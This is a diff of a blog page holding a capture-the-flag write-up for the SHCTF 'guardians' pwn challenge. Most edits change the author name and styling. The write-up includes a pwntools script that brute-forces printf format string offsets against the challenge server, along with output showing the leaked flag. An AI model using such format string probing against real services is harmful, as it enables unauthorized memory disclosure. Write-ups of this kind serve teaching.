@@ -19,8 +19,8 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://enscribe.dev/asset/banner/banner-guardians.png">
 <meta property="article:published_time" content="2022-04-06T17:33:54.000Z">
-<meta property="article:modified_time" content="2022-06-10T01:44:28.928Z">
-<meta property="article:author" content="jktrn">
+<meta property="article:modified_time" content="2022-06-12T21:57:55.258Z">
+<meta property="article:author" content="enscribe">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="shctf">
@@ -135,7 +135,7 @@
 
     <div class="meta">
       <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">jktrn</span>
+        <span itemprop="name">enscribe</span>
       </span>
       
     <div class="postdate">
@@ -154,8 +154,7 @@
         <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/shctf/" rel="tag">shctf</a>
     </div>
 
- <br>
-      <i class="fas fa-clock"></i> 3 min. read
+
     </div>
   </header>
   
@@ -167,6 +166,8 @@
         padding: 1rem;
         font-size: 90%;
         text-align: center;
+        margin-top: 1rem;
+        margin-bottom: 1rem;
     }
     .flex-container {
         display: flex;
@@ -175,23 +176,23 @@
     }
 </style>
 
-<p class="box">
+<div class="box">
 Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format? <code>nc 0.cloud.chals.io 12690</code><br>
 <b>Author</b>: GlitchArchetype<br>
-<b>Files</b>: <a target="_blank" rel="noopener" href="https://github.com/WhileSEC/shctf/blob/main/challenges/pwn/guardians-of-the-galaxy/files/guardians">guardians</a>
-</p>
+<b>Files</b>: <a href="/asset/shctf/guardians">guardians</a>
+</div>
 
 <p>Let’s look at what happens when you run that binary given to us.</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./guardians </span><br><span class="line">Error, please message admins with &#x27;infinity_error&#x27;.</span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./guardians</span> </span><br><span class="line">Error, please message admins with &#x27;infinity_error&#x27;.</span><br></pre></td></tr></table></figure>
 
 <p>This error is because the binary is probably trying to reference a <code>flag.txt</code> within its directory that doesn’t exist. Let’s create one and run it again:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ touch flag.txt &amp;&amp; echo &quot;FLAGHERE&quot; &gt; flag.txt</span><br><span class="line">$ ./guardians</span><br><span class="line">Does Quill manage to win the dance battle?</span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> flag.txt &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;FLAGHERE&quot;</span> &gt; flag.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./guardians</span></span><br><span class="line">Does Quill manage to win the dance battle?</span><br></pre></td></tr></table></figure>
 
 <p>There, we got it to work locally. Since we know that this is problem a format string vulnerability from the “find a successful distraction format” part of the description, let’s assume that the vulnerability is it writing our input to the stack with <code>printf()</code>. We will need to work our way up the stack with the format <code>%n$s</code>, where <code>n</code> is the decimal index of the argument you want, and <code>s</code> is the <code>printf()</code> specifier for a <strong>string of characters</strong>. I wrote this Python3&#x2F;pwntools script here to achieve this loop:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">        p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12690</span>)  </span><br><span class="line">        log.info(<span class="string">f&quot;Trying offset <span class="subst">&#123;i&#125;</span>...&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">bytes</span>((<span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$s&#x27;</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        output = p.recvS()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;shctf&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                log.success(output)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
 
 <p>As you can see, it will send a UTF-8 encoded format string, with <code>str(i)</code> being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let’s run it:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 0...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 1...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 2...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 3...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 4...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 5...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 6...</span><br><span class="line">[+] Does Quill manage to win the dance battle?</span><br><span class="line">    </span><br><span class="line">    Oh no, Ronano has seen through the distraction!</span><br><span class="line">    shctf&#123;im_distracting_you&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 exp.py</span></span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 0...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 1...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 2...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 3...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 4...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 5...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 6...</span><br><span class="line">[+] Does Quill manage to win the dance battle?</span><br><span class="line">    </span><br><span class="line">    Oh no, Ronano has seen through the distraction!</span><br><span class="line">    shctf&#123;im_distracting_you&#125;</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a></p>
 
@@ -256,7 +257,7 @@ Ronan the Accuser has the Power Stone. Can Starlord find a successful distractio
     
     
     2022
-    jktrn
+    enscribe
   </div>
   <div class="footer-right">
     <nav>
